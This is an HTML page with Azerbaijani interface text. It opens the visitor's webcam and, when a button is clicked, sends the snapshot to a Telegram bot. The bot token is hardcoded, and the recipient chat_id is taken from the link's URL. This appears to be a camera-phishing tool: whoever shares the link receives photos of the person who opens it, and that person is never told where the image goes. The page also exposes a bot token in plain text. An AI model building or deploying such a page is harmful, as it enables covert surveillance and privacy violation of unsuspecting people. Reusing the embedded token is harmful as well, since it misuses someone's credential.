<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kamera Çəkilişi</title>
    <style>
        body { background: #111; color: #0f0; font-family: monospace; text-align: center; padding: 50px; }
        video { width: 80%; max-width: 500px; border: 3px solid #0f0; border-radius: 12px; }
        button { background: #0f0; color: #111; border: none; padding: 15px 30px; font-size: 20px; cursor: pointer; border-radius: 8px; margin-top: 20px; }
        button:hover { background: #0c0; }
        #status { margin-top: 20px; font-size: 18px; }
    </style>
</head>
<body>
    <h1>📸 Kamera aktivləşdirilir...</h1>
    <video id="video" autoplay muted></video><br>
    <button id="capture">📸 Şəkil çək</button>
    <div id="status"></div>

    <script>
        const video = document.getElementById('video');
        const statusDiv = document.getElementById('status');
        const captureBtn = document.getElementById('capture');

        // URL parametrlərindən chat_id al
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('chat_id');
        if (!chatId) {
            statusDiv.innerHTML = '❌ Xəta: chat_id tapılmadı.';
            throw new Error('No chat_id');
        }

        // SƏNİN BOT TOKENİN
        const BOT_TOKEN = "8840269817:AAE2owjpICs-t_x7FceNKwZ6eeDS5DfX5Hs";
        const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;

        // Kamera aç
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                statusDiv.innerHTML = '✅ Kamera hazırdır. "Şəkil çək" düyməsinə bas.';
            })
            .catch(err => {
                statusDiv.innerHTML = '❌ Kamera icazəsi alınmadı: ' + err.message;
            });

        // Çəkiliş
        function capturePhoto() {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(function(blob) {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'snapshot.jpg');

                fetch(API_URL, {
                    method: 'POST',
                    body: formData
                })
                .then(res => res.json())
                .then(data => {
                    if (data.ok) {
                        statusDiv.innerHTML = '✅ Şəkil göndərildi!';
                    } else {
                        statusDiv.innerHTML = '❌ Göndərmə xətası: ' + data.description;
                    }
                })
                .catch(err => {
                    statusDiv.innerHTML = '❌ Şəbəkə xətası: ' + err.message;
                });
            }, 'image/jpeg', 0.95);
        }

        captureBtn.addEventListener('click', capturePhoto);
    </script>
</body>
</html>
